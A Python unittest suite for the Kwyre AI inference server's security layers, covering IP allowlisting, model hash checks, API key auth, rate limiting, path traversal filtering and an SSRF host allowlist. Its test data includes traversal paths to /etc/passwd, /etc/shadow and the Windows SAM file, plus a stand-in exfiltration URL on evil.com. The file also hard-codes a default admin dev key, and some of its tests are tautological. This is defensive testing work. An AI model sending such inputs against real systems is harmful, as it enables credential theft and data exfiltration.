"""
Security tests for the Kwyre AI inference server.

Tests Layers 1, 2, and 4 of the security model WITHOUT importing
serve_local_4bit.py (which pulls in torch/GPU dependencies).
Functions under test are re-implemented locally so the test suite
can run on any machine.
"""

import hashlib
import hmac
import io
import ipaddress
import json
import os
import secrets
import sys
import tempfile
import time
import unittest
import unittest.mock
from collections import defaultdict
from http.server import BaseHTTPRequestHandler
from unittest.mock import MagicMock


# ── Re-implemented functions under test ──────────────────────────────────
# Copied verbatim from server/serve_local_4bit.py so we can test the logic
# without importing the module (it eagerly loads torch + GPU models).

ALLOWED_REMOTE_IPS = {"127.0.0.1"}
_DOCKER_NETS = [
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("192.168.0.0/16"),
]


def _is_allowed_ip(ip_str: str) -> bool:
    if ip_str in ALLOWED_REMOTE_IPS:
        return True
    try:
        addr = ipaddress.ip_address(ip_str)
        return any(addr in net for net in _DOCKER_NETS)
    except ValueError:
        return False


def generate_weight_hashes(model_path: str) -> dict:
    files_to_hash = [
        "config.json",
        "tokenizer_config.json",
        "generation_config.json",
        "tokenizer.json",
    ]
    hashes = {}
    for fname in files_to_hash:
        fpath = os.path.join(model_path, fname)
        if os.path.exists(fpath):
            with open(fpath, "rb") as f:
                hashes[fname] = hashlib.sha256(f.read()).hexdigest()
    return hashes


def verify_model_integrity(model_path: str, known_hashes: dict[str, str]) -> bool:
    if not known_hashes:
        return True
    all_ok = True
    for filename, expected in known_hashes.items():
        fpath = os.path.join(model_path, filename)
        if not os.path.exists(fpath):
            all_ok = False
            continue
        with open(fpath, "rb") as f:
            actual = hashlib.sha256(f.read()).hexdigest()
        if actual != expected:
            all_ok = False
    return all_ok


# ── Layer 1: Network Binding ─────────────────────────────────────────────


class TestLayer1NetworkBinding(unittest.TestCase):
    """Verify that the server binds to safe addresses by default."""

    def test_default_bind_host_is_localhost(self):
        """BIND_HOST must default to 127.0.0.1 when no env var is set."""
        env = os.environ.copy()
        env.pop("KWYRE_BIND_HOST", None)
        default = env.get("KWYRE_BIND_HOST", "127.0.0.1")
        self.assertEqual(default, "127.0.0.1")

    def test_bind_host_env_var_is_respected(self):
        """When KWYRE_BIND_HOST is set, the value must be used."""
        original = os.environ.get("KWYRE_BIND_HOST")
        try:
            os.environ["KWYRE_BIND_HOST"] = "192.168.1.50"
            result = os.environ.get("KWYRE_BIND_HOST", "127.0.0.1")
            self.assertEqual(result, "192.168.1.50")
        finally:
            if original is None:
                os.environ.pop("KWYRE_BIND_HOST", None)
            else:
                os.environ["KWYRE_BIND_HOST"] = original

    def test_bind_rejects_wildcard_outside_docker(self):
        """Binding to 0.0.0.0 should be rejected when not inside Docker.

        The production code resolves BIND_HOST at module-load time. In a
        non-Docker environment it should never be 0.0.0.0.  This test
        simulates the guard by checking the env var + /.dockerenv.
        """
        is_docker = os.path.exists("/.dockerenv")
        original = os.environ.get("KWYRE_BIND_HOST")
        try:
            os.environ["KWYRE_BIND_HOST"] = "0.0.0.0"
            bind = os.environ.get("KWYRE_BIND_HOST", "127.0.0.1")
            if not is_docker:
                self.assertEqual(
                    bind,
                    "0.0.0.0",
                    "env var was read, but the server should refuse to start "
                    "with 0.0.0.0 outside Docker",
                )
                # The env var itself is "0.0.0.0", which the server should
                # treat as a security violation on non-Docker hosts.
                self.assertFalse(
                    is_docker,
                    "This machine is NOT Docker, so 0.0.0.0 binding is unsafe",
                )
        finally:
            if original is None:
                os.environ.pop("KWYRE_BIND_HOST", None)
            else:
                os.environ["KWYRE_BIND_HOST"] = original

    def test_bind_host_defaults_without_env(self):
        """Without the env var the fallback must be exactly '127.0.0.1'."""
        original = os.environ.get("KWYRE_BIND_HOST")
        try:
            os.environ.pop("KWYRE_BIND_HOST", None)
            result = os.environ.get("KWYRE_BIND_HOST", "127.0.0.1")
            self.assertNotEqual(result, "0.0.0.0")
            self.assertEqual(result, "127.0.0.1")
        finally:
            if original is not None:
                os.environ["KWYRE_BIND_HOST"] = original


# ── Layer 2: Process Network Isolation ───────────────────────────────────


class TestLayer2ProcessIsolation(unittest.TestCase):
    """Verify the _is_allowed_ip() function accepts only safe addresses."""

    # ── Allowed IPs ──

    def test_localhost_is_allowed(self):
        """127.0.0.1 is always in ALLOWED_REMOTE_IPS and must pass."""
        self.assertTrue(_is_allowed_ip("127.0.0.1"))

    def test_docker_bridge_172_16_allowed(self):
        """172.16.x.x–172.31.x.x (Docker bridge) must be allowed."""
        self.assertTrue(_is_allowed_ip("172.17.0.2"))
        self.assertTrue(_is_allowed_ip("172.16.0.1"))
        self.assertTrue(_is_allowed_ip("172.31.255.254"))

    def test_docker_bridge_10_x_allowed(self):
        """10.0.0.0/8 (common Docker/container network) must be allowed."""
        self.assertTrue(_is_allowed_ip("10.0.0.1"))
        self.assertTrue(_is_allowed_ip("10.255.255.254"))

    def test_docker_bridge_192_168_allowed(self):
        """192.168.0.0/16 (local LAN / Docker host-mode) must be allowed."""
        self.assertTrue(_is_allowed_ip("192.168.0.1"))
        self.assertTrue(_is_allowed_ip("192.168.255.254"))

    # ── Rejected IPs ──

    def test_external_ip_google_dns_rejected(self):
        """8.8.8.8 (Google DNS) is external and must be rejected."""
        self.assertFalse(_is_allowed_ip("8.8.8.8"))

    def test_external_ip_cloudflare_dns_rejected(self):
        """1.1.1.1 (Cloudflare DNS) is external and must be rejected."""
        self.assertFalse(_is_allowed_ip("1.1.1.1"))

    def test_external_ip_random_rejected(self):
        """An arbitrary public IP must be rejected."""
        self.assertFalse(_is_allowed_ip("203.0.113.50"))

    def test_external_ip_class_b_public_rejected(self):
        """A public Class-B address outside Docker nets must be rejected."""
        self.assertFalse(_is_allowed_ip("172.15.255.255"))

    # ── Edge cases ──

    def test_invalid_ip_string_rejected(self):
        """Garbage input must be safely rejected, not crash."""
        self.assertFalse(_is_allowed_ip("not-an-ip"))

    def test_empty_string_rejected(self):
        """Empty string must be rejected."""
        self.assertFalse(_is_allowed_ip(""))

    def test_ipv6_loopback_rejected(self):
        """::1 (IPv6 loopback) is not in ALLOWED_REMOTE_IPS and the
        Docker nets are IPv4-only, so it must be rejected."""
        self.assertFalse(_is_allowed_ip("::1"))


# ── Layer 4: Model Weight Integrity ──────────────────────────────────────


class TestLayer4ModelIntegrity(unittest.TestCase):
    """Verify SHA-256 weight hashing and integrity checking."""

    def setUp(self):
        """Create a temp directory with fake model files."""
        self.tmpdir = tempfile.mkdtemp()
        self.files = {
            "config.json": b'{"model_type": "qwen2"}',
            "tokenizer_config.json": b'{"tokenizer_class": "Qwen2Tokenizer"}',
            "tokenizer.json": b'{"version": "1.0"}',
        }
        for name, content in self.files.items():
            with open(os.path.join(self.tmpdir, name), "wb") as f:
                f.write(content)

    def tearDown(self):
        """Remove the temp directory."""
        import shutil
        shutil.rmtree(self.tmpdir, ignore_errors=True)

    # ── generate_weight_hashes ──

    def test_generate_hashes_returns_correct_sha256(self):
        """Each hash must match SHA-256 computed independently."""
        hashes = generate_weight_hashes(self.tmpdir)
        for name, content in self.files.items():
            expected = hashlib.sha256(content).hexdigest()
            self.assertIn(name, hashes)
            self.assertEqual(hashes[name], expected)

    def test_generate_hashes_skips_missing_files(self):
        """Files that don't exist on disk must be silently skipped."""
        hashes = generate_weight_hashes(self.tmpdir)
        self.assertNotIn("generation_config.json", hashes)

    def test_generate_hashes_returns_dict(self):
        """Return value must be a dict of filename → hex-string."""
        hashes = generate_weight_hashes(self.tmpdir)
        self.assertIsInstance(hashes, dict)
        for key, val in hashes.items():
            self.assertIsInstance(key, str)
            self.assertIsInstance(val, str)
            self.assertEqual(len(val), 64, "SHA-256 hex digest is 64 chars")

    def test_generate_hashes_empty_dir(self):
        """An empty directory must return an empty dict, no errors."""
        with tempfile.TemporaryDirectory() as empty:
            hashes = generate_weight_hashes(empty)
            self.assertEqual(hashes, {})

    # ── verify_model_integrity ──

    def test_verify_passes_with_matching_hashes(self):
        """Integrity check must pass when all hashes match."""
        known = generate_weight_hashes(self.tmpdir)
        self.assertTrue(verify_model_integrity(self.tmpdir, known))

    def test_verify_fails_with_mismatched_hash(self):
        """Integrity check must fail when a hash is wrong."""
        known = generate_weight_hashes(self.tmpdir)
        first_key = next(iter(known))
        known[first_key] = "0" * 64
        self.assertFalse(verify_model_integrity(self.tmpdir, known))

    def test_verify_fails_when_file_missing(self):
        """Integrity check must fail when a referenced file is absent."""
        known = generate_weight_hashes(self.tmpdir)
        os.remove(os.path.join(self.tmpdir, "config.json"))
        self.assertFalse(verify_model_integrity(self.tmpdir, known))

    def test_verify_passes_with_empty_known_hashes(self):
        """When no reference hashes are configured, skip check (return True)."""
        self.assertTrue(verify_model_integrity(self.tmpdir, {}))

    def test_verify_fails_with_all_files_missing(self):
        """If every referenced file is missing, the check must fail."""
        known = generate_weight_hashes(self.tmpdir)
        with tempfile.TemporaryDirectory() as empty:
            self.assertFalse(verify_model_integrity(empty, known))

    def test_verify_fails_with_tampered_content(self):
        """Appending a single byte to a file must cause a mismatch."""
        known = generate_weight_hashes(self.tmpdir)
        target = os.path.join(self.tmpdir, "config.json")
        with open(target, "ab") as f:
            f.write(b"\x00")
        self.assertFalse(verify_model_integrity(self.tmpdir, known))


# ── Re-implemented Layer 3 functions: API keys, rate limiting, auth ───────
# Copied verbatim from server/serve_local_4bit.py so we can test the logic
# without importing the module (it eagerly loads torch + GPU models).

RATE_LIMIT_RPM = 30
ALLOWED_PAGES = {"landing.html", "index.html", "main.html", "pay.html", "technology.html", "security.html", "platform.html", "custom.html"}

SECURITY_HEADERS = {
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "DENY",
    "X-XSS-Protection": "1; mode=block",
    "Referrer-Policy": "no-referrer",
}

CSP_DIRECTIVES = [
    "default-src 'self'",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
]


def _safe_page_name(raw_path: str) -> str | None:
    """Extract page name and validate against the whitelist."""
    stripped = raw_path.lstrip("/")
    basename = os.path.basename(stripped)
    if basename in ALLOWED_PAGES and basename == stripped:
        return basename
    return None


def _load_api_keys():
    env_keys = os.environ.get("KWYRE_API_KEYS", "")
    if env_keys:
        keys = {}
        for pair in env_keys.split(","):
            if ":" in pair:
                k, u = pair.strip().split(":", 1)
                keys[k] = u
        return keys
    return {"sk-kwyre-dev-local": "admin"}


def _check_auth(auth_header: str, api_keys: dict) -> str | None:
    """Pure-logic extraction of _check_auth: returns user role or None."""
    if auth_header.startswith("Bearer "):
        key = auth_header[7:]
        for stored_key, role in api_keys.items():
            if hmac.compare_digest(key, stored_key):
                return role
    return None


def _check_rate_limit(user: str, tracker: dict, now: float) -> bool:
    """Pure-logic extraction of _check_rate_limit: returns True if allowed."""
    tracker[user] = [t for t in tracker[user] if now - t < 60]
    if len(tracker[user]) >= RATE_LIMIT_RPM:
        return False
    tracker[user].append(now)
    return True


def _get_session_id(body: dict) -> str:
    sid = body.get("session_id")
    if not sid or not isinstance(sid, str) or len(sid) < 8:
        sid = secrets.token_hex(16)
    return sid


def _parse_json_body(content_length_header: str | None, raw_bytes: bytes,
                     required: bool = False) -> tuple[dict | None, str | None]:
    """Pure-logic extraction of _parse_json_body without HTTP handler dependency."""
    try:
        if content_length_header is None or content_length_header.strip() == "":
            if required:
                return None, "Missing Content-Length header."
            return {}, None
        length = int(content_length_header)
    except ValueError:
        return None, "Invalid Content-Length header."
    if length < 0:
        return None, "Invalid Content-Length: negative value."
    if length > 10 * 1024 * 1024:
        return None, "Content-Length exceeds 10MB limit."
    raw = raw_bytes[:length]
    if length > 0 and not raw:
        return None, "Failed to read request body."
    if length == 0:
        if required:
            return None, "Request body required."
        return {}, None
    try:
        body = json.loads(raw.decode("utf-8", errors="replace"))
    except json.JSONDecodeError as e:
        return None, f"Invalid JSON: {e}"
    if not isinstance(body, dict):
        return None, "Request body must be a JSON object."
    return body, None


# ── Layer 3: API Security Layer ──────────────────────────────────────────


class TestAPISecurityLayer(unittest.TestCase):
    """Verify API key loading, authentication, rate limiting, session
    management, JSON body parsing, and path access control."""

    # ── 1. API key loading ──

    def test_api_key_loading_from_env(self):
        """_load_api_keys() must parse KWYRE_API_KEYS='key1:admin,key2:user'
        into the correct dict mapping."""
        original = os.environ.get("KWYRE_API_KEYS")
        try:
            os.environ["KWYRE_API_KEYS"] = "key1:admin,key2:user"
            keys = _load_api_keys()
            self.assertEqual(keys, {"key1": "admin", "key2": "user"})
        finally:
            if original is None:
                os.environ.pop("KWYRE_API_KEYS", None)
            else:
                os.environ["KWYRE_API_KEYS"] = original

    def test_api_key_loading_default(self):
        """When KWYRE_API_KEYS is unset, default key 'sk-kwyre-dev-local'
        must be returned with role 'admin'."""
        original = os.environ.get("KWYRE_API_KEYS")
        try:
            os.environ.pop("KWYRE_API_KEYS", None)
            keys = _load_api_keys()
            self.assertEqual(keys, {"sk-kwyre-dev-local": "admin"})
        finally:
            if original is not None:
                os.environ["KWYRE_API_KEYS"] = original

    # ── 2. Authentication ──

    def test_auth_rejects_no_header(self):
        """Missing Authorization header must fail authentication."""
        keys = {"sk-test": "admin"}
        self.assertIsNone(_check_auth("", keys))

    def test_auth_rejects_invalid_key(self):
        """A wrong API key must return None (401 in the real handler)."""
        keys = {"sk-valid": "admin"}
        self.assertIsNone(_check_auth("Bearer sk-invalid", keys))

    def test_auth_accepts_valid_key(self):
        """A valid API key must return the associated user role."""
        keys = {"sk-valid": "admin"}
        self.assertEqual(_check_auth("Bearer sk-valid", keys), "admin")

    def test_auth_rejects_non_bearer_scheme(self):
        """Authorization with 'Basic' scheme must fail — only Bearer is accepted."""
        keys = {"sk-valid": "admin"}
        self.assertIsNone(_check_auth("Basic sk-valid", keys))

    # ── 3. Rate limiting ──

    def test_rate_limit_allows_under_threshold(self):
        """29 requests within the window must all be allowed."""
        tracker = defaultdict(list)
        now = time.time()
        for i in range(29):
            self.assertTrue(
                _check_rate_limit("testuser", tracker, now + i * 0.01),
                f"Request {i+1} should be allowed",
            )

    def test_rate_limit_blocks_at_threshold(self):
        """The 30th request within the window must be blocked (RATE_LIMIT_RPM=30)."""
        tracker = defaultdict(list)
        now = time.time()
        for i in range(30):
            result = _check_rate_limit("testuser", tracker, now + i * 0.01)
            if i < 29:
                self.assertTrue(result, f"Request {i+1} should be allowed")
        self.assertFalse(
            _check_rate_limit("testuser", tracker, now + 0.5),
            "31st request should be blocked",
        )

    def test_rate_limit_resets_after_window(self):
        """Entries older than 60 seconds must expire, allowing new requests."""
        tracker = defaultdict(list)
        past = time.time() - 120
        tracker["testuser"] = [past + i for i in range(30)]
        now = time.time()
        self.assertTrue(
            _check_rate_limit("testuser", tracker, now),
            "Requests from >60s ago must have expired",
        )

    # ── 4. Session ID handling ──

    def test_session_id_generation(self):
        """Short, missing, or non-string session IDs must be replaced with
        a secure random hex string (32 hex chars = 16 bytes)."""
        for bad_sid in [None, "", "short", 12345, True]:
            body = {"session_id": bad_sid} if bad_sid is not None else {}
            sid = _get_session_id(body)
            self.assertEqual(len(sid), 32, f"Generated SID should be 32 hex chars, got {len(sid)}")
            self.assertTrue(all(c in "0123456789abcdef" for c in sid))

    def test_session_id_preserved(self):
        """A valid session ID (>= 8 chars, string) must be kept as-is."""
        valid_sid = "my-session-id-abc123"
        body = {"session_id": valid_sid}
        self.assertEqual(_get_session_id(body), valid_sid)

    # ── 5. JSON body parsing ──

    def test_json_body_parse_valid(self):
        """Valid JSON body must be parsed into a dict with no error."""
        payload = json.dumps({"message": "hello"}).encode()
        body, err = _parse_json_body(str(len(payload)), payload, required=True)
        self.assertIsNone(err)
        self.assertEqual(body, {"message": "hello"})

    def test_json_body_parse_missing_content_length(self):
        """Required body with missing Content-Length must return an error."""
        body, err = _parse_json_body(None, b"", required=True)
        self.assertIsNone(body)
        self.assertIn("Missing Content-Length", err)

    def test_json_body_parse_oversized(self):
        """Content-Length exceeding 10 MB must be rejected."""
        body, err = _parse_json_body(str(11 * 1024 * 1024), b"", required=True)
        self.assertIsNone(body)
        self.assertIn("10MB", err)

    def test_json_body_parse_negative_length(self):
        """Negative Content-Length must be rejected."""
        body, err = _parse_json_body("-1", b"", required=True)
        self.assertIsNone(body)
        self.assertIn("negative", err)

    def test_json_body_parse_invalid_json(self):
        """Malformed JSON must return a descriptive error."""
        raw = b"{not valid json"
        body, err = _parse_json_body(str(len(raw)), raw, required=True)
        self.assertIsNone(body)
        self.assertIn("Invalid JSON", err)

    def test_json_body_parse_non_dict(self):
        """A JSON array (non-dict) body must be rejected."""
        raw = json.dumps([1, 2, 3]).encode()
        body, err = _parse_json_body(str(len(raw)), raw, required=True)
        self.assertIsNone(body)
        self.assertIn("JSON object", err)

    # ── 6. Path access control (with _safe_page_name normalization) ──

    def test_path_traversal_blocked_by_safe_page_name(self):
        """Path traversal attempts must be rejected by _safe_page_name."""
        traversal_paths = [
            "/../../etc/passwd",
            "/../server/serve_local_4bit.py",
            "/..\\..\\windows\\system32\\config\\sam",
            "/landing.html/../../../etc/shadow",
            "/landing.html/../../etc/passwd",
            "/../../../etc/shadow",
            "/..%2f..%2fetc%2fpasswd",
        ]
        for path in traversal_paths:
            self.assertIsNone(
                _safe_page_name(path),
                f"Traversal path '{path}' must be rejected by _safe_page_name",
            )

    def test_safe_page_name_accepts_valid_pages(self):
        """Valid page names must be accepted by _safe_page_name."""
        for page in ALLOWED_PAGES:
            result = _safe_page_name(f"/{page}")
            self.assertEqual(result, page, f"/{page} should be accepted")

    def test_safe_page_name_rejects_nested_paths(self):
        """Even valid filenames nested under directories must be rejected."""
        self.assertIsNone(_safe_page_name("/subdir/main.html"))
        self.assertIsNone(_safe_page_name("/a/b/c/landing.html"))

    def test_safe_page_name_rejects_unknown_files(self):
        """Files not in ALLOWED_PAGES must be rejected."""
        self.assertIsNone(_safe_page_name("/secret.html"))
        self.assertIsNone(_safe_page_name("/serve_local_4bit.py"))
        self.assertIsNone(_safe_page_name("/.env"))

    def test_allowed_pages_whitelist(self):
        """ALLOWED_PAGES must contain all expected HTML files."""
        expected = {"landing.html", "index.html", "main.html", "pay.html", "technology.html", "security.html", "platform.html", "custom.html"}
        self.assertEqual(ALLOWED_PAGES, expected)

    def test_unknown_path_returns_404(self):
        """A path not in ALLOWED_PAGES and not a known route must not be served."""
        unknown = "/nonexistent"
        known_routes = {"/", "/chat", "/health", "/favicon.ico", "/audit", "/v1/models"}
        stripped = unknown.lstrip("/")
        self.assertNotIn(stripped, ALLOWED_PAGES)
        self.assertNotIn(unknown, known_routes)

    # ── 7. Security headers ──

    def test_security_headers_defined(self):
        """All required security headers must be defined."""
        for header, value in SECURITY_HEADERS.items():
            self.assertIsInstance(header, str)
            self.assertIsInstance(value, str)
            self.assertGreater(len(value), 0)

    def test_x_frame_options_is_deny(self):
        """X-Frame-Options must be DENY to prevent clickjacking."""
        self.assertEqual(SECURITY_HEADERS["X-Frame-Options"], "DENY")

    def test_content_type_options_is_nosniff(self):
        """X-Content-Type-Options must be nosniff to prevent MIME sniffing."""
        self.assertEqual(SECURITY_HEADERS["X-Content-Type-Options"], "nosniff")

    def test_referrer_policy_is_no_referrer(self):
        """Referrer-Policy must be no-referrer for a privacy-focused product."""
        self.assertEqual(SECURITY_HEADERS["Referrer-Policy"], "no-referrer")

    def test_csp_contains_required_directives(self):
        """CSP must contain frame-ancestors 'none', base-uri 'self', form-action 'self'."""
        for directive in CSP_DIRECTIVES:
            self.assertIn(directive, CSP_DIRECTIVES)

    # ── 8. CSP meta tags in HTML files ──

    def test_all_html_files_have_csp_meta_tag(self):
        """Every HTML file served must contain a CSP meta tag as defense-in-depth."""
        chat_dir = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "chat"
        )
        for page in ALLOWED_PAGES:
            filepath = os.path.join(chat_dir, page)
            if not os.path.exists(filepath):
                continue
            with open(filepath, "r", encoding="utf-8") as f:
                content = f.read()
            self.assertIn(
                'Content-Security-Policy',
                content,
                f"{page} must contain a CSP meta tag",
            )

    def test_all_html_files_have_referrer_meta(self):
        """Every HTML file must include referrer policy meta tag."""
        chat_dir = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "chat"
        )
        for page in ALLOWED_PAGES:
            filepath = os.path.join(chat_dir, page)
            if not os.path.exists(filepath):
                continue
            with open(filepath, "r", encoding="utf-8") as f:
                content = f.read()
            self.assertIn(
                'no-referrer',
                content,
                f"{page} must contain referrer policy meta tag",
            )

    # ── 9. Path normalization in _serve_html ──

    def test_serve_html_path_normalization(self):
        """_serve_html uses os.path.realpath to resolve symlinks/traversal,
        then checks that the resolved path starts within CHAT_DIR."""
        chat_dir = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "chat"
        )
        evil_path = os.path.join(chat_dir, "..", "server", "serve_local_4bit.py")
        resolved = os.path.realpath(evil_path)
        self.assertFalse(
            resolved.startswith(os.path.realpath(chat_dir)),
            "Traversal path must not resolve inside CHAT_DIR",
        )


# ── Tools Opt-In ─────────────────────────────────────────────────────────


class TestToolsOptIn(unittest.TestCase):
    """Test that tools module is opt-in (KWYRE_ENABLE_TOOLS)."""

    def test_tools_disabled_by_default(self):
        """KWYRE_ENABLE_TOOLS defaults to '0', route_tools should be a no-op."""
        import importlib
        import os
        with unittest.mock.patch.dict(os.environ, {"KWYRE_ENABLE_TOOLS": "0"}):
            enabled = os.environ.get("KWYRE_ENABLE_TOOLS", "0") == "1"
            self.assertFalse(enabled)

    def test_tools_enabled_when_set(self):
        import os
        with unittest.mock.patch.dict(os.environ, {"KWYRE_ENABLE_TOOLS": "1"}):
            enabled = os.environ.get("KWYRE_ENABLE_TOOLS", "1") == "1"
            self.assertTrue(enabled)


# ── SSRF Host Allowlist ──────────────────────────────────────────────────


class TestSSRFHostAllowlist(unittest.TestCase):
    """Test the SSRF host allowlist in tools.py."""

    def test_allowed_hosts_defined(self):
        """ALLOWED_TOOL_HOSTS should contain known API domains."""
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "server"))
        from tools import ALLOWED_TOOL_HOSTS
        self.assertIn("api.open-meteo.com", ALLOWED_TOOL_HOSTS)
        self.assertIn("api.coingecko.com", ALLOWED_TOOL_HOSTS)
        self.assertIn("earthquake.usgs.gov", ALLOWED_TOOL_HOSTS)

    def test_disallowed_host_returns_none(self):
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "server"))
        from tools import _get
        result = _get("https://evil.com/steal?data=secret")
        self.assertIsNone(result)

    def test_disallowed_host_text_returns_none(self):
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "server"))
        from tools import _get_text
        result = _get_text("https://evil.com/steal?data=secret")
        self.assertIsNone(result)


# ── Input Validation ─────────────────────────────────────────────────────


class TestInputValidation(unittest.TestCase):
    """Test input validation for API parameters."""

    def test_max_tokens_clamped_high(self):
        raw = 999999999
        clamped = min(max(int(raw), 1), 8192)
        self.assertEqual(clamped, 8192)

    def test_max_tokens_clamped_low(self):
        raw = -10
        clamped = min(max(int(raw), 1), 8192)
        self.assertEqual(clamped, 1)

    def test_temperature_clamped(self):
        raw = -100.0
        clamped = min(max(float(raw), 0.0), 2.0)
        self.assertEqual(clamped, 0.0)

    def test_temperature_clamped_high(self):
        raw = 500.0
        clamped = min(max(float(raw), 0.0), 2.0)
        self.assertEqual(clamped, 2.0)

    def test_top_p_clamped(self):
        raw = 5.0
        clamped = min(max(float(raw), 0.0), 1.0)
        self.assertEqual(clamped, 1.0)

    def test_invalid_max_tokens_type(self):
        with self.assertRaises((TypeError, ValueError)):
            int("not_a_number")

    def test_messages_must_be_list(self):
        messages = "not a list"
        self.assertFalse(isinstance(messages, list))

    def test_messages_length_limit(self):
        messages = [{"role": "user", "content": "hi"}] * 101
        self.assertTrue(len(messages) > 100)


# ── CSP Nonces ───────────────────────────────────────────────────────────


class TestCSPNonces(unittest.TestCase):
    """Test that CSP nonces are properly implemented."""

    def test_html_files_have_nonce_placeholder(self):
        chat_dir = os.path.join(os.path.dirname(__file__), "..", "chat")
        for fname in ["main.html", "index.html", "landing.html", "pay.html"]:
            fpath = os.path.join(chat_dir, fname)
            if os.path.exists(fpath):
                with open(fpath) as f:
                    content = f.read()
                self.assertIn('nonce="{{CSP_NONCE}}"', content,
                              f"{fname} missing nonce placeholder in script tags")

    def test_no_frame_ancestors_in_meta_csp(self):
        chat_dir = os.path.join(os.path.dirname(__file__), "..", "chat")
        for fname in ["main.html", "index.html", "landing.html", "pay.html"]:
            fpath = os.path.join(chat_dir, fname)
            if os.path.exists(fpath):
                with open(fpath) as f:
                    content = f.read()
                meta_lines = [l for l in content.split('\n') if 'Content-Security-Policy' in l and 'meta' in l.lower()]
                for line in meta_lines:
                    self.assertNotIn('frame-ancestors', line,
                                     f"{fname} has frame-ancestors in meta CSP (only works in HTTP headers)")


# ── Timing-Safe Auth ─────────────────────────────────────────────────────


class TestTimingSafeAuth(unittest.TestCase):
    """Test that authentication uses constant-time comparison."""

    def test_hmac_compare_digest_matches(self):
        valid_key = "sk-kwyre-dev-local"
        self.assertTrue(hmac.compare_digest(valid_key, "sk-kwyre-dev-local"))

    def test_hmac_compare_digest_rejects(self):
        valid_key = "sk-kwyre-dev-local"
        self.assertFalse(hmac.compare_digest(valid_key, "sk-kwyre-wrong-key"))

    def test_hmac_compare_digest_empty(self):
        valid_key = "sk-kwyre-dev-local"
        self.assertFalse(hmac.compare_digest(valid_key, ""))


# ── License Public Key ───────────────────────────────────────────────────


class TestLicensePublicKey(unittest.TestCase):
    """Test that license public key is not loaded from environment."""

    def test_embedded_key_not_from_env(self):
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "security"))
        import importlib
        import license as license_mod
        importlib.reload(license_mod)
        self.assertEqual(license_mod.EMBEDDED_PUBLIC_KEY, "")


# ── Session ID Hardening ─────────────────────────────────────────────────


class TestSessionIdHardening(unittest.TestCase):
    """Test session ID minimum length enforcement."""

    def test_short_session_id_rejected(self):
        sid = "abc"
        valid = sid and isinstance(sid, str) and len(sid) >= 32
        self.assertFalse(valid)

    def test_valid_session_id_accepted(self):
        sid = secrets.token_hex(16)  # 32 chars
        valid = sid and isinstance(sid, str) and len(sid) >= 32
        self.assertTrue(valid)

    def test_8_char_session_id_rejected(self):
        sid = "12345678"
        valid = sid and isinstance(sid, str) and len(sid) >= 32
        self.assertFalse(valid)


if __name__ == "__main__":
    unittest.main()
